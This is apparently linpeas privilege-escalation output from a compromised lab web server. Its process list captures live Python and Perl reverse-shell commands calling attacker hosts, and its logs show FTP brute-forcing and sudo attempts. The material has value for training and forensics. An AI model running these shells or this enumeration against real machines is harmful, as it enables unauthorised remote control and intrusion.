  Process 11402 (www-data) - python3 -c import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("R
    └─ Has open files:
      └─ /dev/ptmx
  Process 11403 (www-data) - sh 
    └─ Has open files:
      └─ /dev/pts/0
      └─ /dev/tty
  Process 15789 (www-data) - sh -c export RHOST="10.0.1.5";export RPORT=9002;python3 -c 'import sys,socket,os,pty;s=socket.socket
    └─ Has open files:
      └─ pipe:[670946]
      └─ /var/log/apache2/error.log
  Process 15790 (www-data) - python3 -c import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("R
    └─ Has open files:
      └─ /dev/ptmx
  Process 15791 (www-data) - sh 
    └─ Has open files:
      └─ /dev/pts/1
      └─ /dev/tty
  Process 33725 (www-data) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
    └─ Has open files:
      └─ pipe:[555672]
  Process 33728 (www-data) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
    └─ Has open files:
      └─ pipe:[689535]
  Process 33731 (www-data) - grep accessible 
    └─ Has open files:
      └─ pipe:[689535]
      └─ pipe:[555672]
  Process 33732 (www-data) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
    └─ Has open files:
      └─ pipe:[689535]
  Process 33735 (www-data) - dd bs=9000 count=1 
    └─ Has open files:
      └─ pipe:[689538]
  Process 33736 (www-data) - xxd 
    └─ Has open files:
      └─ pipe:[689538]
      └─ pipe:[689535]
  Process 43979 (www-data) - cat f 
    └─ Has open files:
      └─ /dev/pts/1
  Process 43985 (www-data) - sh -c export RHOST="10.0.1.5";export RPORT=9002;python3 -c 'import sys,socket,os,pty;s=socket.socket
    └─ Has open files:
      └─ pipe:[710698]
      └─ /var/log/apache2/error.log
  Process 43986 (www-data) - python3 -c import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("R
    └─ Has open files:
      └─ /dev/ptmx
  Process 43987 (www-data) - sh 
    └─ Has open files:
      └─ /dev/pts/2
      └─ /dev/tty
  Process 48470 (www-data) - sh -c perl -e 'use Socket;$i="10.0.1.10";$p=1000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))
    └─ Has open files:
      └─ pipe:[731232]
      └─ /var/log/apache2/error.log
  Process 73866 (www-data) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
    └─ Has open files:
      └─ pipe:[756524]
  Process 73867 (www-data) - grep accessible 
    └─ Has open files:
      └─ pipe:[756524]
  Process 73870 (www-data) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
    └─ Has open files:
      └─ pipe:[756524]
  Process 73875 (www-data) - dd bs=9000 count=1 
    └─ Has open files:
      └─ pipe:[756533]
  Process 73876 (www-data) - xxd 
    └─ Has open files:
      └─ pipe:[756533]
      └─ pipe:[756524]
  Process 105690 (www-data) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
    └─ Has open files:
      └─ pipe:[799782]
  Process 105692 (www-data) - grep accessible 
    └─ Has open files:
      └─ pipe:[799782]
  Process 105695 (www-data) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
    └─ Has open files:
      └─ pipe:[799782]
  Process 105700 (www-data) - dd bs=9000 count=1 
    └─ Has open files:
      └─ pipe:[799789]
  Process 105701 (www-data) - xxd 
    └─ Has open files:
      └─ pipe:[799789]
      └─ pipe:[799782]

  ╔══════════╣ Processes with memory-mapped credential files
                                                                                                                                  
  ╔══════════╣ Processes whose PPID belongs to a different user (not root)
  ╚ You will know if a user can somehow spawn processes as a different user                                                        
                                                                                                                                  
  ╔══════════╣ Files opened by processes belonging to other users
  ╚ This is usually empty because of the lack of privileges to read other user processes information                               
                                                                                                                                  
  ╔══════════╣ Check for vulnerable cron jobs
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                             
  ══╣ Cron jobs list                                                                                                               
  /usr/bin/crontab                                                                                                                 
  incrontab Not Found
  -rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab                                                                         

  /etc/cron.d:
  total 20
  drwxr-xr-x  2 root root 4096 Sep  7  2020 .
  drwxr-xr-x 89 root root 4096 Nov  4  2023 ..
  -rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
  -rw-r--r--  1 root root  670 Jun 22  2017 php
  -rw-r--r--  1 root root  191 Sep  7  2020 popularity-contest

  /etc/cron.daily:
  total 48
  drwxr-xr-x  2 root root 4096 Sep  7  2020 .
  drwxr-xr-x 89 root root 4096 Nov  4  2023 ..
  -rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
  -rwxr-xr-x  1 root root  539 Jul 15  2020 apache2
  -rwxr-xr-x  1 root root  920 Apr  5  2016 apt-compat
  -rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
  -rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
  -rwxr-xr-x  1 root root  372 May  5  2015 logrotate
  -rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
  -rwxr-xr-x  1 root root  435 Nov 17  2014 mlocate
  -rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
  -rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest

  /etc/cron.hourly:
  total 12
  drwxr-xr-x  2 root root 4096 Sep  7  2020 .
  drwxr-xr-x 89 root root 4096 Nov  4  2023 ..
  -rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

  /etc/cron.monthly:
  total 12
  drwxr-xr-x  2 root root 4096 Sep  7  2020 .
  drwxr-xr-x 89 root root 4096 Nov  4  2023 ..
  -rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

  /etc/cron.weekly:
  total 20
  drwxr-xr-x  2 root root 4096 Sep  7  2020 .
  drwxr-xr-x 89 root root 4096 Nov  4  2023 ..
  -rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
  -rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
  -rwxr-xr-x  1 root root  771 Nov  6  2015 man-db

  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

  ══╣ Checking for specific cron jobs vulnerabilities
  Checking cron directories...                                                                                                     

  ╔══════════╣ System timers
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                         
  ══╣ Active timers:                                                                                                               
  NEXT                         LEFT      LAST                         PASSED       UNIT                         ACTIVATES          
  Sat 2025-11-22 07:03:55 PST  6min left Sat 2025-11-22 01:42:21 PST  5h 14min ago apt-daily.timer              apt-daily.service
  Sun 2025-11-23 04:33:45 PST  21h left  Sat 2025-11-22 04:33:45 PST  2h 23min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
  n/a                          n/a       n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service
  ══╣ Disabled timers:
  ══╣ Additional timer files:                                                                                                      
                                                                                                                                  
  ╔══════════╣ Services and Service Files
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                       
                                                                                                                                  
  ══╣ Active services:
  accounts-daemon.service            loaded active running Accounts Service                                                        
  apache2.service                    loaded active running LSB: Apache2 web server
  ./linpeas.sh: 3944: local: /etc/init: bad variable name
  Not Found
                                                                                                                                  
  ══╣ Disabled services:
  console-getty.service                 disabled                                                                                   
  console-shell.service                 disabled
  ./linpeas.sh: 3944: local: /bin/systemctl: bad variable name
  Not Found
                                                                                                                                  
  ══╣ Additional service files:
  ./linpeas.sh: 3944: local: /bin/systemctl: bad variable name                                                                     
  You can't write on systemd PATH

  ╔══════════╣ Systemd Information
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                  
  ═╣ Systemd version and vulnerabilities? .............. ═╣ Services running as root? .....                                        
  ═╣ Running services with dangerous capabilities? ... 
  ═╣ Services with writable paths? . rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n)

  ╔══════════╣ Systemd PATH
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                  
  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                

  ╔══════════╣ Analyzing .socket files
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                        
  ./linpeas.sh: 4207: local: /run/systemd/journal/socket: bad variable name                                                        

  ╔══════════╣ Unix Sockets Analysis
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                        
  /run/dbus/system_bus_socket                                                                                                      
    └─(Read Write (Weak Permissions: 666) )
    └─(Owned by root)
  /run/systemd/fsck.progress
  /run/systemd/journal/dev-log
    └─(Read Write (Weak Permissions: 666) )
    └─(Owned by root)
  /run/systemd/journal/socket
    └─(Read Write (Weak Permissions: 666) )
    └─(Owned by root)
  /run/systemd/journal/stdout
    └─(Read Write (Weak Permissions: 666) )
    └─(Owned by root)
  /run/systemd/journal/syslog
    └─(Read Write (Weak Permissions: 666) )
    └─(Owned by root)
  /run/systemd/notify
    └─(Read Write Execute (Weak Permissions: 777) )
    └─(Owned by root)
  /run/systemd/private
    └─(Read Write Execute (Weak Permissions: 777) )
    └─(Owned by root)
  /run/udev/control
  /run/uuidd/request
    └─(Read Write (Weak Permissions: 666) )
    └─(Owned by root)
  /run/vmware/guestServicePipe
    └─(Read Write (Weak Permissions: 666) )
    └─(Owned by root)
  /var/run/dbus/system_bus_socket
    └─(Read Write (Weak Permissions: 666) )
    └─(Owned by root)
  /var/run/vmware/guestServicePipe
    └─(Read Write (Weak Permissions: 666) )
    └─(Owned by root)

  ╔══════════╣ D-Bus Analysis
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                          
  NAME                               PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
  :1.0                                 1 systemd         root             :1.0          init.scope                -          -                  
  :1.1                               595 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
  :1.2                               593 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
  :1.207                            5417 busctl          www-data         :1.207        apache2.service           -          -                  
  com.ubuntu.LanguageSelector          - -               -                (activatable) -                         -         
  org.freedesktop.Accounts           593 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
  org.freedesktop.DBus               612 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                  
  org.freedesktop.hostname1            - -               -                (activatable) -                         -         
  org.freedesktop.locale1              - -               -                (activatable) -                         -         
  org.freedesktop.login1             595 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
  org.freedesktop.network1             - -               -                (activatable) -                         -         
  org.freedesktop.resolve1             - -               -                (activatable) -                         -         
  org.freedesktop.systemd1             1 systemd         root             :1.0          init.scope                -          -                  
  org.freedesktop.timedate1            - -               -                (activatable) -                         -         

  ╔══════════╣ D-Bus Configuration Files
  Analyzing /etc/dbus-1/system.d/com.ubuntu.LanguageSelector.conf:                                                                 
    └─(Allow rules in default context)
              └─                 <allow send_interface="com.ubuntu.LanguageSelector"/>
                          <allow receive_interface="com.ubuntu.LanguageSelector"
                          <allow send_destination="com.ubuntu.LanguageSelector"
  Analyzing /etc/dbus-1/system.d/org.freedesktop.Accounts.conf:
    └─(Allow rules in default context)
              └─     <allow send_destination="org.freedesktop.Accounts"/>
              <allow send_destination="org.freedesktop.Accounts"
              <allow send_destination="org.freedesktop.Accounts"
  Analyzing /etc/dbus-1/system.d/org.freedesktop.hostname1.conf:
    └─(Allow rules in default context)
              └─                 <allow send_destination="org.freedesktop.hostname1"/>
                          <allow receive_sender="org.freedesktop.hostname1"/>
  Analyzing /etc/dbus-1/system.d/org.freedesktop.locale1.conf:
    └─(Allow rules in default context)
              └─                 <allow send_destination="org.freedesktop.locale1"/>
                          <allow receive_sender="org.freedesktop.locale1"/>
  Analyzing /etc/dbus-1/system.d/org.freedesktop.login1.conf:
    └─(Allow rules in default context)
              └─                 <allow send_destination="org.freedesktop.login1"
  Analyzing /etc/dbus-1/system.d/org.freedesktop.network1.conf:
    └─(Weak user policy found)
      └─         <policy user="systemd-network">
    └─(Allow rules in default context)
              └─                 <allow send_destination="org.freedesktop.network1"
  Analyzing /etc/dbus-1/system.d/org.freedesktop.resolve1.conf:
    └─(Weak user policy found)
      └─         <policy user="systemd-resolve">
    └─(Allow rules in default context)
              └─                 <allow send_destination="org.freedesktop.resolve1"/>
                          <allow receive_sender="org.freedesktop.resolve1"/>
  Analyzing /etc/dbus-1/system.d/org.freedesktop.systemd1.conf:
    └─(Allow rules in default context)
              └─                 <allow send_destination="org.freedesktop.systemd1"
  Analyzing /etc/dbus-1/system.d/org.freedesktop.timedate1.conf:
    └─(Allow rules in default context)
              └─                 <allow send_destination="org.freedesktop.timedate1"/>
                          <allow receive_sender="org.freedesktop.timedate1"/>

  ══╣ D-Bus Session Bus Analysis
  (Access to session bus available)                                                                                                


  ╔══════════╣ Legacy r-commands (rsh/rlogin/rexec) and host-based trust
                                                                                                                                  
  ══╣ Listening r-services (TCP 512-514)
                                                                                                                                  
  ══╣ systemd units exposing r-services
  rlogin|rsh|rexec units Not Found                                                                                                 
                                                                                                                                  
  ══╣ inetd/xinetd configuration for r-services
  /etc/inetd.conf Not Found                                                                                                        
  /etc/xinetd.d Not Found                                                                                                          
                                                                                                                                  
  ══╣ Installed r-service server packages
    No related packages found via dpkg                                                                                             

  ══╣ /etc/hosts.equiv and /etc/shosts.equiv
                                                                                                                                  
  ══╣ Per-user .rhosts files
  .rhosts Not Found                                                                                                                
                                                                                                                                  
  ══╣ PAM rhosts authentication
  /etc/pam.d/rlogin|rsh Not Found                                                                                                  
                                                                                                                                  
  ══╣ SSH HostbasedAuthentication
    HostbasedAuthentication no or not set                                                                                          

  ══╣ Potential DNS control indicators (local)
    Not detected                                                                                                                   

  ╔══════════╣ Crontab UI (root) misconfiguration checks
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                             
  crontab-ui Not Found                                                                                                             
                                                                                                                                  

                                ╔═════════════════════╗
  ══════════════════════════════╣ Network Information ╠══════════════════════════════                                              
                                ╚═════════════════════╝                                                                            
  ╔══════════╣ Interfaces
  # symbolic names for networks, see networks(5) for more information                                                              
  link-local 169.254.0.0
  ens33     Link encap:Ethernet  HWaddr 00:0c:29:1c:a2:af  
            inet addr:10.0.0.28  Bcast:10.0.0.255  Mask:255.255.255.0
            inet6 addr: fe80::20c:29ff:fe1c:a2af/64 Scope:Link
            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
            RX packets:16325668 errors:0 dropped:0 overruns:0 frame:0
            TX packets:16275274 errors:0 dropped:0 overruns:0 carrier:0
            collisions:0 txqueuelen:1000 
            RX bytes:2488577593 (2.4 GB)  TX bytes:7615020273 (7.6 GB)

  lo        Link encap:Local Loopback  
            inet addr:127.0.0.1  Mask:255.0.0.0
            inet6 addr: ::1/128 Scope:Host
            UP LOOPBACK RUNNING  MTU:65536  Metric:1
            RX packets:14553 errors:0 dropped:0 overruns:0 frame:0
            TX packets:14553 errors:0 dropped:0 overruns:0 carrier:0
            collisions:0 txqueuelen:1 
            RX bytes:1148512 (1.1 MB)  TX bytes:1148512 (1.1 MB)


  ╔══════════╣ Hostname, hosts and DNS
  ══╣ Hostname Information                                                                                                         
  System hostname: ubuntu                                                                                                          
  FQDN: ubuntu

  ══╣ Hosts File Information
  Contents of /etc/hosts:                                                                                                          
    127.0.0.1     localhost
    127.0.1.1     ubuntu
    ::1     localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters

  ══╣ DNS Configuration
  DNS Servers (resolv.conf):                                                                                                       
    10.0.0.254
    search CEHLAB.local
  -e 
  Systemd-resolved configuration:
    [Resolve]
  -e 
  DNS Domain Information:
  (none)
  -e 
  DNS Cache Status (systemd-resolve):

  ╔══════════╣ Active Ports
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                     
  ══╣ Active Ports (netstat)                                                                                                       
  tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                                                
  tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      853/nginx: worker p
  tcp        0      0 0.0.0.0:2211            0.0.0.0:*               LISTEN      -               
  tcp6       0      0 :::80                   :::*                    LISTEN      853/nginx: worker p
  tcp6       0      0 :::21                   :::*                    LISTEN      -               
  tcp6       0      0 :::2211                 :::*                    LISTEN      -               

  ╔══════════╣ Network Traffic Analysis Capabilities
                                                                                                                                  
  ══╣ Available Sniffing Tools
  tcpdump is available                                                                                                             

  ══╣ Network Interfaces Sniffing Capabilities
  Interface ens33: Not sniffable                                                                                                   
  No sniffable interfaces found

  ╔══════════╣ Firewall Rules Analysis
                                                                                                                                  
  ══╣ Iptables Rules
  No permission to list iptables rules                                                                                             

  ══╣ Nftables Rules
  nftables Not Found                                                                                                               
                                                                                                                                  
  ══╣ Firewalld Rules
  firewalld Not Found                                                                                                              
                                                                                                                                  
  ══╣ UFW Rules
  UFW is not running                                                                                                               

  ╔══════════╣ Inetd/Xinetd Services Analysis
                                                                                                                                  
  ══╣ Inetd Services
  inetd Not Found                                                                                                                  
                                                                                                                                  
  ══╣ Xinetd Services
  xinetd Not Found                                                                                                                 
                                                                                                                                  
  ══╣ Running Inetd/Xinetd Services
  Active Services (from netstat):                                                                                                  
  -e 
  Active Services (from ss):
  -e 
  Running Service Processes:

  ╔══════════╣ Internet Access?
  Port 443 is accessible                                                                                                           
  Port 80 is accessible
  ICMP is accessible
  Port 443 is not accessible with wget
  DNS is not accessible



                                ╔═══════════════════╗
  ═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                              
                                ╚═══════════════════╝                                                                             
  ╔══════════╣ My user
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                          
  uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                            

  ╔══════════╣ PGP Keys and Related Files
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys                                       
  GPG:                                                                                                                             
  GPG is installed, listing keys:
  -e 
  NetPGP:
  netpgpkeys Not Found
  -e                                                                                                                               
  PGP Related Files:

  ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                  
                                                                                                                                  

  ╔══════════╣ Checking sudo tokens
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                            
  ptrace protection is enabled (1)                                                                                                 

  doas.conf Not Found
                                                                                                                                  
  ╔══════════╣ Checking Pkexec and Polkit
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2      
                                                                                                                                  
  ══╣ Polkit Binary
                                                                                                                                  
  ══╣ Polkit Policies
                                                                                                                                  
  ══╣ Polkit Authentication Agent
                                                                                                                                  
  ╔══════════╣ Superusers and UID 0 Users
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html                    
                                                                                                                                  
  ══╣ Users with UID 0 in /etc/passwd
  root:x:0:0:root:/root:/bin/bash                                                                                                  

  ══╣ Users with sudo privileges in sudoers
                                                                                                                                  
  ╔══════════╣ Users with console
  root:x:0:0:root:/root:/bin/bash                                                                                                  
  tomato:x:1000:1000:Tomato,,,:/home/tomato:/bin/bash

  ╔══════════╣ All users & groups
  uid=0(root) gid=0(root) groups=0(root)                                                                                           
  uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
  uid=10(uucp) gid=10(uucp) groups=10(uucp)
  uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
  uid=1000(tomato) gid=1000(tomato) groups=1000(tomato),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
  uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
  uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
  uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
  uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
  uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
  uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
  uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
  uid=108(sshd) gid=65534(nogroup) groups=65534(nogroup)
  uid=109(ftp) gid=117(ftp) groups=117(ftp)
  uid=13(proxy) gid=13(proxy) groups=13(proxy)
  uid=2(bin) gid=2(bin) groups=2(bin)
  uid=3(sys) gid=3(sys) groups=3(sys)
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  uid=34(backup) gid=34(backup) groups=34(backup)
  uid=38(list) gid=38(list) groups=38(list)
  uid=39(irc) gid=39(irc) groups=39(irc)
  uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
  uid=41(gnats) gid=41(gnats) groups=41(gnats)
  uid=5(games) gid=60(games) groups=60(games)
  uid=6(man) gid=12(man) groups=12(man)
  uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
  uid=7(lp) gid=7(lp) groups=7(lp)
  uid=8(mail) gid=8(mail) groups=8(mail)
  uid=9(news) gid=9(news) groups=9(news)

  ╔══════════╣ Currently Logged in Users
                                                                                                                                  
  ══╣ Basic user information
  06:57:32 up 2 days,  2:39,  0 users,  load average: 0.01, 0.18, 0.30                                                            
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

  ══╣ Active sessions
  06:57:32 up 2 days,  2:39,  0 users,  load average: 0.01, 0.18, 0.30                                                            
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

  ══╣ Logged in users (utmp)
            system boot  Nov 20 02:00                                                                                             
            run-level 5  Nov 20 04:18
  LOGIN      tty1         Nov 20 04:18               647 id=tty1

  ══╣ SSH sessions
                                                                                                                                  
  ══╣ Screen sessions
                                                                                                                                  
  ══╣ Tmux sessions
                                                                                                                                  
  ╔══════════╣ Last Logons and Login History
                                                                                                                                  
  ══╣ Last logins
  reboot   system boot  4.4.0-21-generic Thu Nov 20 02:00   still running                                                          
  reboot   system boot  4.4.0-21-generic Sat Nov 15 02:45   still running
  root     tty1                          Sat Nov 15 05:03 - crash  (-2:-17)
  reboot   system boot  4.4.0-21-generic Sat Jan 20 04:14   still running
  root     tty1                          Sat Jan 20 04:48 - down   (00:-34)
  reboot   system boot  4.4.0-21-generic Sat Nov  4 05:52 - 04:14 (76+23:21)
  reboot   system boot  4.4.0-21-generic Sat Nov  4 04:28 - 04:14 (77+00:45)
  root     tty1                          Sat Nov  4 04:25 - crash  (00:03)
  reboot   system boot  4.4.0-21-generic Sat Nov  4 04:24 - 04:14 (77+00:49)
  reboot   system boot  4.4.0-21-generic Sat Oct 28 04:09 - 02:49 (2+22:39)
  reboot   system boot  4.4.0-21-generic Sat Oct 28 04:07 - 04:09  (00:01)
  tomato   pts/0        192.168.17.172   Mon Sep  7 02:58 - 03:00  (00:02)
  reboot   system boot  4.4.0-21-generic Mon Sep  7 02:56 - 04:09 (1146+01:12)
  tomato   pts/0        192.168.17.172   Mon Sep  7 02:12 - 02:35  (00:23)
  reboot   system boot  4.4.0-21-generic Mon Sep  7 02:11 - 02:35  (00:24)
  tomato   pts/1        192.168.17.45    Mon Sep  7 02:11 - 02:11  (00:00)
  tomato   pts/0        192.168.17.172   Mon Sep  7 02:10 - 02:11  (00:01)
  tomato   pts/0        192.168.17.172   Mon Sep  7 02:06 - 02:08  (00:02)
  tomato   pts/0        192.168.17.172   Mon Sep  7 01:32 - 02:03  (00:31)
  tomato   tty1                          Mon Sep  7 01:31 - down   (00:39)

  wtmp begins Mon Sep  7 01:16:06 2020

  ══╣ Failed login attempts
                                                                                                                                  
  ══╣ Recent logins from auth.log (limit 20)
  Nov 22 05:29:46 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=anonymous rhost=::ffff:10.0.1.6
  Nov 22 05:29:46 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=anonymous rhost=::ffff:10.0.1.6
  Nov 22 05:29:46 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=anonymous rhost=::ffff:10.0.1.6
  Nov 22 05:31:02 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=kali rhost=::ffff:10.0.1.6
  Nov 22 05:31:16 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=anonymous rhost=::ffff:10.0.1.6
  Nov 22 05:31:37 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=anonymous rhost=::ffff:10.0.1.6
  Nov 22 05:31:49 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=admin rhost=::ffff:10.0.1.6
  Nov 22 05:31:59 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=root rhost=::ffff:10.0.1.6  user=root
  Nov 22 05:49:19 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=anonymous rhost=::ffff:10.0.1.6
  Nov 22 05:49:19 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=anonymous rhost=::ffff:10.0.1.6
  Nov 22 05:49:20 ubuntu vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty=ftp ruser=anonymous rhost=::ffff:10.0.1.6
  Nov 22 06:18:45 ubuntu sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/0 ruser=www-data rhost=  user=www-data
  Nov 22 06:33:18 ubuntu sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost=  user=www-data
  Nov 22 06:33:22 ubuntu nologin: Attempted login by UNKNOWN on UNKNOWN
  Nov 22 06:44:39 ubuntu sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost=  user=www-data
  Nov 22 06:44:45 ubuntu nologin: Attempted login by UNKNOWN on UNKNOWN
  Nov 22 06:46:35 ubuntu sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost=  user=www-data
  Nov 22 06:46:40 ubuntu nologin: Attempted login by UNKNOWN on UNKNOWN
  Nov 22 06:57:28 ubuntu sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/2 ruser=www-data rhost=  user=www-data
  Nov 22 06:57:32 ubuntu nologin: Attempted login by UNKNOWN on UNKNOWN

  ══╣ Last time logon each user
  Username         Port     From             Latest                                                                                
  root             tty1                      Sat Nov 15 05:03:07 -0800 2025
  tomato           pts/0    192.168.17.172   Mon Sep  7 02:58:41 -0700 2020

  ╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                                                                                                           
                                                                                                                                  
  ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                  


                              ╔══════════════════════╗
  ═════════════════════════════╣ Software Information ╠═════════════════════════════                                               
                              ╚══════════════════════╝                                                                            
  ╔══════════╣ Useful software
  /usr/bin/base64                                                                                                                  
  /bin/nc
  /bin/netcat
  /usr/bin/perl
  /usr/bin/php
  /bin/ping
  /usr/bin/python3
  /usr/bin/sudo
  /usr/bin/wget

  ╔══════════╣ Installed Compilers
  ii  gcc-5                              5.4.0-6ubuntu1~16.04.12          amd64        GNU C compiler                              
  /usr/bin/gcc-5
  /usr/share/gcc-5

  ╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
  Apache version: Server version: Apache/2.4.18 (Ubuntu)                                                                           
  Server built:   2020-08-12T21:35:50
  httpd Not Found
                                                                                                                                  
  Nginx version: 
  /etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
  /etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
  --
  /etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
  /etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
  --
  /etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
  /etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
  --
